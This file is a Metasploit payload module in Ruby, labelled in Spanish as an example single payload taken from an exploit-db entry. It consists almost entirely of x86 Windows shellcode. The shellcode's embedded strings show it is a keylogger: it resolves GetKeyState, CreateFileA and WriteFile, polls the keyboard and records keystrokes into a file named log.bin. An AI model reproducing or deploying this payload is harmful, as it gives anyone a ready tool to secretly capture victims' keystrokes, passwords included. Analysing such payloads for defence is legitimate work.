require 'msf/core'
require 'msf/core/payload/windows/exec'

module MetasploitModule

  CachedSize = 431

  include Msf::Payload::Windows
  include Msf::Payload::Single

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Ejemplo de single payload"',
      'Description'   => 'Payload extraido de https://www.exploit-db.com/exploits/39731/',
      'Author'        => [ 'Fugu' ],
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Privileged'    => false,
      'Payload'       =>
      {
        'Offsets' => { },
        'Payload' =>
           "\xfc\x31\xd2\xb2\x30\x64\xff\x32\x5a\x8b\x52\x0c\x8b\x52\x14\x8b" + 
           "\x72\x28\x31\xc0\x89\xc1\xb1\x03\xac\xc1\xc0\x08\xac\xe2\xf9\xac" + 
           "\x3d\x4e\x52\x45\x4b\x74\x05\x3d\x6e\x72\x65\x6b\x8b\x5a\x10\x8b" + 
           "\x12\x75\xdc\x8b\x53\x3c\x01\xda\xff\x72\x34\x8b\x52\x78\x01\xda" + 
           "\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74" + 
           "\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64" + 
           "\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x8b" + 
           "\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd7\x52\x31\xc0\x50\x68" + 
           "\x64\x6c\x65\x41\x68\x65\x48\x61\x6e\x68\x6f\x64\x75\x6c\x68\x47" + 
           "\x65\x74\x4d\x54\x53\xff\xd7\x8d\x64\x24\x14\x50\x68\x4c\x4c\x01" + 
           "\x88\xfe\x4c\x24\x02\x68\x33\x32\x2e\x44\x68\x55\x53\x45\x52\x54" + 
           "\xff\xd0\x31\xd2\x39\xd0\x75\x38\x8d\x64\x24\x0c\x52\x68\x61\x72" + 
           "\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd7" + 
           "\x8d\x64\x24\x10\x50\x68\x4c\x4c\x01\x77\xfe\x4c\x24\x02\x68\x33" + 
           "\x32\x2e\x44\x68\x55\x53\x45\x52\x54\xff\xd0\x8d\x64\x24\x0c\x50" + 
           "\x89\xc2\x68\x61\x74\x65\x01\xfe\x4c\x24\x03\x68\x65\x79\x53\x74" + 
           "\x68\x47\x65\x74\x4b\x54\x52\xff\xd7\x8d\x64\x24\x0c\x50\x68\x65" + 
           "\x01\x01\x55\xfe\x4c\x24\x01\x68\x65\x46\x69\x6c\x68\x57\x72\x69" + 
           "\x74\x54\x53\xff\xd7\x8d\x64\x24\x0c\x50\x68\x6c\x65\x41\x01\xfe" + 
           "\x4c\x24\x03\x68\x74\x65\x46\x69\x68\x43\x72\x65\x61\x54\x53\xff" + 
           "\xd7\x8d\x64\x24\x0c\x50\x68\x62\x69\x6e\x01\xfe\x4c\x24\x03\x68" + 
           "\x6c\x6f\x67\x2e\x31\xc9\x51\x51\x80\x04\x24\x80\x6a\x04\x51\x6a" + 
           "\x02\x51\x80\x04\x24\x04\x8d\x4c\x24\x18\x51\xff\xd0\x8d\x64\x24" + 
           "\x08\x50\x31\xc9\x31\xf6\xb1\xff\x89\xf0\x38\xc8\x72\x02\x31\xf6" + 
           "\x46\x56\xff\x54\x24\x10\x89\xf2\x31\xc9\xb1\x80\x21\xc8\x31\xc9" + 
           "\x39\xc8\x74\xe2\x52\x51\x8d\x0c\x24\x51\x6a\x01\x8d\x4c\x24\x0c" + 
           "\x51\xff\x74\x24\x14\xff\x54\x24\x20\x8d\x64\x24\x04\xeb\xc3"
      }
      ))

    # EXITFUNC is not supported :/
    deregister_options('EXITFUNC')
  end

end
